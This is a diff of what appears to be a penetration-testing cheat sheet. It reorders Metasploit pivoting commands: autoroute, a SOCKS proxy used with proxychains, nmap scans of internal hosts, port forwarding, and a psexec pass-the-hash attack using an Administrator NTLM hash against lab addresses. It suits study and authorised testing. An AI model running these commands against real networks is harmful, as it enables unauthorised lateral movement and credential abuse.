@@ -1049,33 +1049,41 @@ nano hashes; cat hashes | awk '{$1=$1}1' | tr -d '\n' | tee hashes; john hashes 
 ## Linux
 ## Windows
 [*] Meterpreter
++---------- Create Route ----------+
 run post/multi/manage/autoroute
-run auxiliary/server/socks_proxy SRVHOST=127.0.0.1 SRVPORT=9050 VERSION=4a
+
++---------- Scan For Hosts ----------+
 run auxiliary/scanner/netbios/nbname RHOSTS=10.10.10.0/24
 
-route
-run post/multi/manage/autoroute ACTION=delete
-jobs -v
-jobs -k 0
-
++---------- Setup Socks Proxy ----------+
+run auxiliary/server/socks_proxy SRVHOST=127.0.0.1 SRVPORT=9050 VERSION=4a
 cp /etc/proxychains.conf /etc/proxychains.conf.backup
 echo "socks4 127.0.0.1 9050" >> /etc/proxychains.conf ; nano /etc/proxychains.conf
 
-proxychains nmap -Pn -sT -p 21,22,88,445,1433,2049,3306,3389,5985 --open 10.10.10.1,2
++---------- Scan Services ----------+
+proxychains nmap -Pn -sT -p 21,88,445,1433,2049,3306,3389,5985 --open 10.10.10.1,2
 
-portfwd add -l 65001 -r 10.10.10.1 -p 445
-portfwd add -l 65002 -r 10.10.10.2 -p 445
-portfwd add -l 65020 -r 10.10.10.20 -p 445
-portfwd add -l 65200 -r 10.10.10.200 -p 445
-portfwd list
-portfwd flush
-
++---------- Attacking Internal Hosts ----------+
 use exploit/windows/smb/psexec
 set LHOST 10.10.10.3
 set RHOSTS 10.10.10.1-2
 set SMBUser Administrator
 set SMBPass be77c30f5bb90694f6fd9e48f380c9c3:6aa6bca0dafa60871fa5ecaf2217e05f
 run
+
++---------- Managing Routes ----------+
+route
+run post/multi/manage/autoroute ACTION=delete
+jobs -v
+jobs -k 0
+
++---------- Port Forwarding ----------+
+portfwd add -l 65001 -r 10.10.10.1 -p 445
+portfwd add -l 65002 -r 10.10.10.2 -p 445
+portfwd add -l 65020 -r 10.10.10.20 -p 445
+portfwd add -l 65200 -r 10.10.10.200 -p 445
+portfwd list
+portfwd flush
 
 [*] Manual
 arp -a
